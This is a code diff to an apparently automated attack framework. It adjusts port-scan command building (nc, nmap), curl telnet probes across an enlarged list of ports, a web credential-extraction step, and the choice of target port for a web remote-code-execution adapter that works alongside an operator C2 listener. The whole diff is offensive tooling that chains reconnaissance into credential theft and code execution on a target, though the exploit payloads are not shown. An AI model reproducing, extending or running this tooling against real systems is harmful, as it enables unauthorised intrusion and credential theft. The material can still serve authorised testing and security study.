@@ -1573,6 +1573,7 @@ def _port_scan_adapter(wm, slots):
     ports = slots.get("port")
     tool = _chosen_tool(wm, "scan_tcp", "nmap")
     target = _effective_target(wm)
+    own_port = split_host_port(_resolve_target_address(wm))[1]
     style = getattr(wm, "scan_style", "balanced")
     if tool == "masscan":
         # fastest full-range sweep: rate-capped to stay survivable,
@@ -1586,13 +1587,20 @@ def _port_scan_adapter(wm, slots):
         # so the command also passes the API allowlist when the operator
         # drives scan_tcp manually from Electron). nc accepts multiple
         # ports and N-M ranges as separate args.
-        spec = ports or _nc_port_spec(wm)
-        return f"nc -zv -w 1 {target} {spec}"
+        spec = str(ports or _nc_port_spec(wm))
+        if own_port and str(own_port) not in spec.split():
+            # The operator named a service (`host:9443`): scan it even when
+            # the shortlist does not carry that non-standard port.
+            spec = f"{own_port} {spec}"
+        return f"nc -zv -w 1 {target} {spec} 2>&1"
     if ports:
         if _full_range(ports):
             return (f"nmap -Pn -sT -n -p {ports} {_full_scan_timing(style)} "
                     f"--max-retries 1 --host-timeout 200s {target}")
         return (f"nmap -Pn -sT -p {ports} --max-retries 1 "
+                f"--host-timeout 120s {target}")
+    if own_port:
+        return (f"nmap -Pn -sT -p {own_port} --max-retries 1 "
                 f"--host-timeout 120s {target}")
     return f"nmap -Pn -sT {_scan_port_spec(wm)} {target}"
 
@@ -1802,11 +1810,13 @@ def _http_get_interp(output: str, wm: WorldModel,
     return findings
 
 
-_CURL_PROBE_PORTS = (21, 22, 25, 80, 110, 143, 443, 587, 8080, 8443)
+_CURL_PROBE_PORTS = (21, 22, 25, 80, 110, 143, 443, 587, 8000, 8080,
+                     8081, 8443, 8888, 9090)
 _CURL_PROBE_SERVICE = {
     21: "ftp", 22: "ssh", 25: "smtp", 80: "http", 110: "pop3",
-    143: "imap", 443: "https", 587: "smtp", 8080: "http-alt",
-    8443: "https-alt",
+    143: "imap", 443: "https", 587: "smtp", 8000: "http-alt",
+    8080: "http-alt", 8081: "http-alt", 8443: "https-alt",
+    8888: "http-alt", 9090: "http-alt",
 }
 
 
@@ -1844,7 +1854,7 @@ def _curl_probe_adapter(wm, slots):
         if port not in ports:
             ports.append(port)
     segments = []
-    for port in ports[:10]:
+    for port in ports[:14]:
         segments.append(f"echo ==CURLPROBE {port}==")
         segments.append(
             f"curl -s -v --max-time 3 telnet://{host}:{port} 2>&1 "
@@ -1999,8 +2009,11 @@ def _web_creds_adapter(wm, slots):
     """Adapter: run the deterministic web→credentials engine on all web
     services; returns WEBCREDS: marker lines the interpreter parses."""
     from phantom.automation.exploit.webcreds import run_web_creds_dump
-    host = _effective_target(wm)
-    creds = run_web_creds_dump(wm, host)
+    host, port = _web_service_target(wm)
+    # Keep the port in the target: the engine splits it off as explicit
+    # intent, so a non-standard web port is probed even when the scan did
+    # not classify it as web.
+    creds = run_web_creds_dump(wm, f"{host}:{port}" if port else host)
     if not creds:
         return "# web credential extraction found no credentials"
     return "\n".join(c.marker() for c in creds)
@@ -2425,26 +2438,19 @@ def _inject_adapter(wm, slots):
 def _web_service_target(wm):
     """(host, port) of the REAL web app to attack.
 
-    Prefers ports with a web-app fingerprint (http_probe), then any web
-    port EXCLUDING the operator's own C2 listener port (the C2 listener
-    binds a web-ish port and the scan sees it as a service — attacking it
-    would upload to our own listener, not the target's app). Defaults 80.
+    The explicit port in the target (`host:8081`, `host:9443`) is INTENT and
+    wins; otherwise use the port the scan actually fingerprinted, from ANY
+    port (not a shortlist of "standard" ones); 80 is only the last resort.
+    The operator's own local C2 listener is still excluded.
     """
     host = _effective_target(wm)
-    app_ports = {str(v.get("port", "")) for f in wm.find("web_app")
-                 if isinstance(f.value, dict)
-                 for v in [f.value]}
+    own_port = split_host_port(_resolve_target_address(wm))[1]
     c2_port = _c2_port_blocks(host) or None
-    web_ports = {str(p) for p in _WEB_PORTS}
-    for f in wm.find("service"):
-        v = f.value if isinstance(f.value, dict) else {}
-        if str(v.get("port", "")) in app_ports:
-            return host, str(v.get("port"))
-    for f in wm.find("service"):
-        v = f.value if isinstance(f.value, dict) else {}
-        p = str(v.get("port", ""))
-        if p in web_ports and p != c2_port:
-            return host, p
+    if own_port and str(own_port) != c2_port:
+        return host, str(own_port)
+    discovered = _discovered_web_port(wm)
+    if discovered and discovered != c2_port:
+        return host, discovered
     return host, "80"
 
 
@@ -2469,7 +2475,7 @@ def _web_rce_adapter(wm, slots):
     with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as tf:
         tf.write(payload)
         tmp = tf.name
-    scheme = "https" if port in ("443", "8443") else "http"
+    scheme = _web_scheme(wm, port)
     # P0: probe the paths the app ITSELF references (web_path findings from
     # http_get) plus the conventional default. One bounded request each, so
     # the probe still costs what it always cost; it just stops assuming that
